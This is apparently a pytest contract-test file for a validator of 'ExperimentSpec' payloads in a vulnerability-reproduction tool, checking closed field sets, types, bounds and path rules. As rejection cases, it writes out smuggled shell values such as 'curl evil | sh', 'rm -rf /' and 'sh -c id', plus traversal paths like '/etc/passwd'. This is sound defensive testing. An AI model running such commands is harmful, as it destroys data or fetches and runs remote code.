"""TC-13: ExperimentSpec closed nine-field contract (REQ-13).

RED-phase contract tests for T14. ``datacon.experiment_spec`` does not exist
yet, so each coordinate imports the contract face inside the test function:
every test then fails at its own missing module instead of one shared
module-level collection error. The valid payload below is the ExperimentSpec
example from interface-contract-delta section 4, used verbatim as fixture.
"""

from __future__ import annotations

import pytest

SPEC_FIELDS = (
    "target_symbol",
    "target_path",
    "target_line",
    "input_family",
    "mutation_constraints",
    "expected_signature",
    "rationale",
    "evidence_refs",
    "confidence",
)


def _valid_spec_payload():
    return {
        "target_symbol": "parse_token",
        "target_path": "src/parser.c",
        "target_line": 42,
        "input_family": "length_boundary",
        "mutation_constraints": {
            "max_input_bytes": 4096,
            "allowed_ops": ["append", "truncate"],
        },
        "expected_signature": {
            "error": "heap-buffer-overflow",
            "function": "parse_token",
            "source": "parser.c",
            "operation": "WRITE",
            "access_size": 1,
        },
        "rationale": "补丁在终止符写入前增加了长度检查，长度边界输入可复核该假设。",
        "evidence_refs": [
            "log/build:fixed#L10-12",
            "patch:fix.patch#hunk-2",
        ],
        "confidence": "medium",
    }


def test_experiment_spec_has_closed_nine_fields():
    from datacon.experiment_spec import (
        ExperimentSpecError,
        parse_experiment_spec,
    )

    payload = _valid_spec_payload()
    spec = parse_experiment_spec(payload)
    assert spec.target_symbol == "parse_token"
    assert spec.target_line == 42
    assert spec.confidence == "medium"

    # Missing any one of the nine required fields is rejected.
    for field in SPEC_FIELDS:
        missing = {
            key: value for key, value in payload.items() if key != field
        }
        with pytest.raises(ExperimentSpecError):
            parse_experiment_spec(missing)

    # An unknown tenth field is rejected.
    with pytest.raises(ExperimentSpecError):
        parse_experiment_spec(payload | {"tenth_field": "extra"})

    # Free command or shell material has no field to hide in: the closed
    # set rejects a command string as well as a concatenated shell recipe.
    with pytest.raises(ExperimentSpecError):
        parse_experiment_spec(payload | {"command": "sh -c ./run.sh"})
    with pytest.raises(ExperimentSpecError):
        parse_experiment_spec(
            payload | {"shell": "bash" + " -c 'gcc exploit.c'"}
        )

    # confidence outside {low, medium, high} is rejected.
    with pytest.raises(ExperimentSpecError):
        parse_experiment_spec(payload | {"confidence": "certain"})


def test_expected_signature_matches_full_accepted_signature():
    from datacon.experiment_spec import signature_matches

    full = {
        "error": "heap-buffer-overflow",
        "function": "parse_token",
        "source": "parser.c",
        "operation": "WRITE",
        "access_size": 1,
    }
    without_optional = {
        "error": "heap-buffer-overflow",
        "function": "parse_token",
        "source": "parser.c",
    }

    # Exact full-field equality matches, with and without optional fields.
    assert signature_matches(full, dict(full)) is True
    assert signature_matches(without_optional, dict(without_optional)) is True

    # The error string alone is not enough: a READ/WRITE difference or a
    # different access_size must not match.
    assert signature_matches(full, full | {"operation": "READ"}) is False
    assert signature_matches(full, full | {"access_size": 2}) is False

    # Presence of the optional fields participates in the comparison on
    # either side.
    assert signature_matches(full, dict(without_optional)) is False
    assert signature_matches(without_optional, dict(full)) is False

    # A missing required field never matches.
    incomplete = dict(without_optional)
    incomplete.pop("source")
    assert signature_matches(without_optional, incomplete) is False


def test_unresolvable_evidence_refs_block_experiment_spec():
    from datacon.experiment_spec import build_from_hypothesis

    payload = _valid_spec_payload()
    refs = list(payload["evidence_refs"])

    def deny_all(ref):
        return False

    def resolve_first(ref):
        return ref == refs[0]

    # No resolvable evidence ref: the hypothesis stays a lead on the caller
    # side; no spec is produced and nothing raises.
    assert build_from_hypothesis(payload, resolver=deny_all) is None

    # Any single resolvable ref is enough to build the spec, and the
    # evidence refs are preserved verbatim.
    spec = build_from_hypothesis(payload, resolver=resolve_first)
    assert spec is not None
    assert list(spec.evidence_refs) == refs


# --- T14 self-review hardening: sub-object contracts, field bounds, typing ---


def test_experiment_spec_rejects_unknown_keys_in_sub_objects():
    from datacon.experiment_spec import ExperimentSpecError, parse_experiment_spec

    payload = _valid_spec_payload()
    constraints = payload["mutation_constraints"]
    signature = payload["expected_signature"]

    # mutation_constraints is a closed key set. Free command or shell material
    # is rejected when it travels alone and when it hides beside legitimate
    # constraints, whatever the type of its value.
    for smuggled in (
        {"command": "sh -c curl evil | sh"},
        constraints | {"command": "sh -c curl evil | sh"},
        {"shell": "bash -c 'gcc exploit.c'"},
        constraints | {"shell": "bash -c 'gcc exploit.c'"},
        constraints | {"generator": {"argv": ["sh", "-c", "id"]}},
    ):
        with pytest.raises(ExperimentSpecError):
            parse_experiment_spec(payload | {"mutation_constraints": smuggled})

    # expected_signature is a closed key set as well: an otherwise complete
    # signature carrying one extra key is still rejected.
    for smuggled in (
        {"shell": "rm -rf /"},
        signature | {"shell": "rm -rf /"},
        signature | {"command": "sh -c id"},
    ):
        with pytest.raises(ExperimentSpecError):
            parse_experiment_spec(payload | {"expected_signature": smuggled})


def test_experiment_spec_validates_sub_object_value_types():
    from datacon.experiment_spec import ExperimentSpecError, parse_experiment_spec

    payload = _valid_spec_payload()
    constraints = payload["mutation_constraints"]
    signature = payload["expected_signature"]

    # max_input_bytes is an integer >= 0: text, negative numbers, booleans,
    # floats and nested values are rejected instead of stored verbatim.
    for value in (
        "4096",
        "unbounded",
        -1,
        True,
        False,
        4096.0,
        {"value": 4096},
        [4096],
    ):
        with pytest.raises(ExperimentSpecError):
            parse_experiment_spec(
                payload
                | {"mutation_constraints": constraints | {"max_input_bytes": value}}
            )

    # allowed_ops is a list, and every item is a lower-case identifier.
    for value in (
        "append",
        {"op": "append"},
        ["Append"],
        ["1st"],
        ["heap-buffer-overflow"],
        ["append truncate"],
        [""],
        [1],
        [["append"]],
        [{"op": "append"}],
    ):
        with pytest.raises(ExperimentSpecError):
            parse_experiment_spec(
                payload | {"mutation_constraints": constraints | {"allowed_ops": value}}
            )

    # error, function and source are required.
    for field in ("error", "function", "source"):
        incomplete = {name: value for name, value in signature.items() if name != field}
        with pytest.raises(ExperimentSpecError):
            parse_experiment_spec(payload | {"expected_signature": incomplete})

    # When present, error/function/source/operation are non-empty strings and
    # access_size is a positive integer; a boolean is not an integer here.
    for value in (
        signature | {"error": ""},
        signature | {"function": 1},
        signature | {"source": None},
        signature | {"operation": ""},
        signature | {"operation": None},
        signature | {"access_size": True},
        signature | {"access_size": False},
        signature | {"access_size": None},
        signature | {"access_size": 0},
        signature | {"access_size": -1},
        signature | {"access_size": "1"},
        signature | {"access_size": 1.0},
    ):
        with pytest.raises(ExperimentSpecError):
            parse_experiment_spec(payload | {"expected_signature": value})

    # A well-formed signature passes with the optional fields present and
    # absent, and validation keeps them exactly as given: their presence
    # takes part in the match.
    spec = parse_experiment_spec(payload)
    assert spec.expected_signature == {
        "error": "heap-buffer-overflow",
        "function": "parse_token",
        "source": "parser.c",
        "operation": "WRITE",
        "access_size": 1,
    }

    required_only = {
        "error": "heap-buffer-overflow",
        "function": "parse_token",
        "source": "parser.c",
    }
    spec = parse_experiment_spec(payload | {"expected_signature": required_only})
    assert spec.expected_signature == required_only

    operation_only = required_only | {"operation": "READ"}
    spec = parse_experiment_spec(payload | {"expected_signature": operation_only})
    assert spec.expected_signature == operation_only

    access_size_only = required_only | {"access_size": 1}
    spec = parse_experiment_spec(payload | {"expected_signature": access_size_only})
    assert spec.expected_signature == access_size_only

    # Boundary values on the constraints pass as well: zero bytes is a legal
    # bound and identifiers may continue with digits and underscores.
    bounded = {"max_input_bytes": 0, "allowed_ops": ["append", "truncate", "flip_bit2"]}
    spec = parse_experiment_spec(payload | {"mutation_constraints": bounded})
    assert spec.mutation_constraints == bounded

    # validate_signature is the one signature validation, shared with
    # b04_eval, and it hands back a copy of the signature it checked.
    from datacon.experiment_spec import validate_signature

    assert validate_signature(signature) == signature
    assert validate_signature(signature) is not signature


def test_experiment_spec_rejects_absolute_or_traversing_target_path():
    from datacon.experiment_spec import ExperimentSpecError, parse_experiment_spec

    payload = _valid_spec_payload()

    # target_path is a repository-relative POSIX path: an absolute path, any
    # ".." segment (escaping or staying inside), a backslash and whitespace
    # are all rejected instead of being stored as text.
    for path in (
        "/etc/passwd",
        "../../secrets.env",
        "src/../parser.c",
        "a\\b",
        "src/parser c",
        " src/parser.c",
    ):
        with pytest.raises(ExperimentSpecError):
            parse_experiment_spec(payload | {"target_path": path})

    # The repository-relative path of the interface example stays accepted.
    spec = parse_experiment_spec(payload)
    assert spec.target_path == "src/parser.c"


def test_experiment_spec_bounds_symbol_family_and_rationale():
    from datacon.agent_contracts import MAX_STATEMENT
    from datacon.experiment_spec import ExperimentSpecError, parse_experiment_spec

    payload = _valid_spec_payload()

    # target_symbol is non-empty, carries no whitespace or control characters
    # and is at most 200 characters long.
    for symbol in (
        "",
        "parse token",
        "parse_token ",
        "parse_token\x00",
        "parse_token\x1b[31m",
        "s" * 201,
    ):
        with pytest.raises(ExperimentSpecError):
            parse_experiment_spec(payload | {"target_symbol": symbol})

    # input_family is a lower-case identifier.
    for family in ("Length-Boundary", "", "length-boundary", "length boundary"):
        with pytest.raises(ExperimentSpecError):
            parse_experiment_spec(payload | {"input_family": family})

    # rationale is a bounded statement, not an unbounded text channel.
    for rationale in ("r" * (MAX_STATEMENT + 1), "r" * 1_000_000):
        with pytest.raises(ExperimentSpecError):
            parse_experiment_spec(payload | {"rationale": rationale})

    # The boundary values pass: a 200-character symbol and a rationale of
    # exactly MAX_STATEMENT characters.
    symbol = "s" * 200
    rationale = "r" * MAX_STATEMENT
    spec = parse_experiment_spec(
        payload | {"target_symbol": symbol, "rationale": rationale}
    )
    assert spec.target_symbol == symbol
    assert spec.rationale == rationale

    # target_symbol has no identifier rule of its own, unlike input_family:
    # scope and template characters are ordinary symbol material.
    spec = parse_experiment_spec(payload | {"target_symbol": "NS::readHeader2"})
    assert spec.target_symbol == "NS::readHeader2"


def test_signature_match_distinguishes_bool_and_float_from_int():
    from datacon.experiment_spec import signature_matches

    def signature(**optional):
        return {
            "error": "heap-buffer-overflow",
            "function": "parse_token",
            "source": "parser.c",
        } | optional

    # A match needs the same value with the same type on every key: a boolean
    # or a float is never the integer 1, on either side of the comparison.
    assert (
        signature_matches(signature(access_size=True), signature(access_size=1))
        is False
    )
    assert (
        signature_matches(signature(access_size=1), signature(access_size=True))
        is False
    )
    assert (
        signature_matches(signature(access_size=1.0), signature(access_size=1)) is False
    )
    assert (
        signature_matches(signature(access_size=1), signature(access_size=1.0)) is False
    )

    # The same integer on both sides matches, alone and beside operation.
    assert signature_matches(signature(access_size=1), signature(access_size=1)) is True
    assert (
        signature_matches(
            signature(operation="WRITE", access_size=1),
            signature(operation="WRITE", access_size=1),
        )
        is True
    )

    # Presence of operation still takes part in the comparison, with and
    # without access_size beside it.
    assert (
        signature_matches(
            signature(operation="WRITE", access_size=1), signature(access_size=1)
        )
        is False
    )
    assert (
        signature_matches(
            signature(access_size=1), signature(operation="WRITE", access_size=1)
        )
        is False
    )
    assert (
        signature_matches(signature(operation="WRITE"), signature(operation="READ"))
        is False
    )


def test_signature_rules_agree_with_the_envelope_validator():
    """A spec signature has to equal one of the envelope's accepted items.

    ``state._envelope_signature_set`` validates the accepted side. A
    signature this module accepts but the envelope refuses can never match
    anything; one the envelope accepts but this module refuses hides a
    usable annotation. Both validators must therefore agree on every
    signature, rule for rule. The envelope validator is private to
    ``state`` on purpose: this test, not a production import, is what keeps
    the two rule sets from drifting apart.
    """
    from datacon import state
    from datacon.experiment_spec import ExperimentSpecError, validate_signature

    base = {
        "error": "heap-buffer-overflow",
        "function": "parse_token",
        "source": "parser.c",
    }
    signatures = [
        base,
        base | {"operation": "READ"},
        base | {"operation": "WRITE", "access_size": 1},
        base | {"access_size": 2**31 - 1},
        base | {"operation": "EXEC"},
        base | {"operation": "read"},
        base | {"operation": ""},
        base | {"operation": None},
        base | {"access_size": 2**31},
        base | {"access_size": 0},
        base | {"access_size": True},
        base | {"access_size": 1.0},
        base | {"access_size": None},
        base | {"error": ""},
        base | {"function": "  "},
        base | {"shell": "rm -rf /"},
        {name: value for name, value in base.items() if name != "function"},
    ]
    for signature in signatures:
        try:
            ours = validate_signature(signature)
        except ExperimentSpecError:
            ours = None
        try:
            theirs = state._envelope_signature_set([signature])[0]
        except ValueError:
            theirs = None
        assert ours == theirs, signature

    # Two rules are stricter here than on the envelope side, on purpose: a
    # C1 control character and text over 200 characters pass the envelope
    # validator and are still refused for a spec signature. Anything else
    # the two validators disagree on fails above.
    for signature in (
        base | {"error": "heap-buffer-overflow\x9b"},
        base | {"error": "e" * 201},
    ):
        state._envelope_signature_set([signature])
        with pytest.raises(ExperimentSpecError):
            validate_signature(signature)


def test_experiment_spec_rejects_non_text_confidence():
    from datacon.experiment_spec import ExperimentSpecError, parse_experiment_spec

    payload = _valid_spec_payload()
    # An unhashable value used to escape as a bare TypeError from the
    # membership test; confidence is text or the spec is refused.
    for confidence in ([], {"medium"}, 1, None, b"medium"):
        with pytest.raises(ExperimentSpecError):
            parse_experiment_spec(payload | {"confidence": confidence})


def test_experiment_spec_bounds_lengths_and_control_characters():
    from datacon.experiment_spec import ExperimentSpecError, parse_experiment_spec

    payload = _valid_spec_payload()
    base_signature = payload["expected_signature"]
    constraints = payload["mutation_constraints"]
    ref = "git:commit/" + "a" * 40

    # U+009B is a control character that is neither whitespace nor covered
    # by ``jsonutil.require_text``; it is still refused.
    for field, value in (
        ("target_path", "src/pa\x9bth.c"),
        ("rationale", "reads past the end\x9b"),
        ("expected_signature", base_signature | {"error": "heap-buffer-overflow\x9b"}),
        ("expected_signature", base_signature | {"operation": "READ\x9b"}),
    ):
        with pytest.raises(ExperimentSpecError):
            parse_experiment_spec(payload | {field: value})

    # Every text and list field is bounded, and the integers share the
    # envelope's ceiling.
    for field, value in (
        ("input_family", "f" * 65),
        ("evidence_refs", [ref] * 65),
        ("expected_signature", base_signature | {"error": "e" * 201}),
        ("expected_signature", base_signature | {"access_size": 2**31}),
        ("mutation_constraints", constraints | {"max_input_bytes": 2**31}),
        ("mutation_constraints", constraints | {"allowed_ops": ["append"] * 65}),
        ("mutation_constraints", constraints | {"allowed_ops": ["a" * 65]}),
    ):
        with pytest.raises(ExperimentSpecError):
            parse_experiment_spec(payload | {field: value})

    # The boundary values pass.
    spec = parse_experiment_spec(
        payload
        | {
            "input_family": "f" * 64,
            "evidence_refs": [ref] * 64,
            "expected_signature": base_signature
            | {"error": "e" * 200, "operation": "READ", "access_size": 2**31 - 1},
            "mutation_constraints": constraints
            | {"max_input_bytes": 2**31 - 1, "allowed_ops": ["append"] * 64},
        }
    )
    assert spec.input_family == "f" * 64
    assert len(spec.evidence_refs) == 64
    assert spec.expected_signature["access_size"] == 2**31 - 1


def test_experiment_spec_requires_at_least_one_evidence_ref():
    from datacon.experiment_spec import (
        ExperimentSpecError,
        parse_experiment_spec,
    )

    # A spec is an experiment plan grounded in evidence; with no reference
    # at all there is nothing to resolve and the payload is not a spec.
    payload = _valid_spec_payload()
    payload["evidence_refs"] = []
    with pytest.raises(ExperimentSpecError) as excinfo:
        parse_experiment_spec(payload)
    assert "non-empty" in str(excinfo.value)


def test_experiment_spec_checks_log_reference_grammar():
    from datacon.experiment_spec import (
        ExperimentSpecError,
        parse_experiment_spec,
    )

    # The log/ namespace follows the frozen §11 grammar delegated to
    # contracts.parse_log_evidence_ref: a descending build range, an
    # unknown build selector and a ranged fuzz line are rejected, while
    # well-formed log refs and v0.1-style refs pass through verbatim.
    for bad_ref in (
        "log/build:fixed#L12-10",
        "log/build:other#L1",
        "log/fuzz:0#L1-5",
    ):
        payload = _valid_spec_payload()
        payload["evidence_refs"] = [bad_ref]
        with pytest.raises(ExperimentSpecError) as excinfo:
            parse_experiment_spec(payload)
        assert "log" in str(excinfo.value), bad_ref

    payload = _valid_spec_payload()
    payload["evidence_refs"] = [
        "log/build:vulnerable#L3",
        "log/build:fixed#L10-12",
        "log/fuzz:0#L1",
        "patch:fix.patch#hunk-2",
        "git:diff/upstream--fixed",
    ]
    spec = parse_experiment_spec(payload)
    assert spec.evidence_refs == tuple(payload["evidence_refs"])
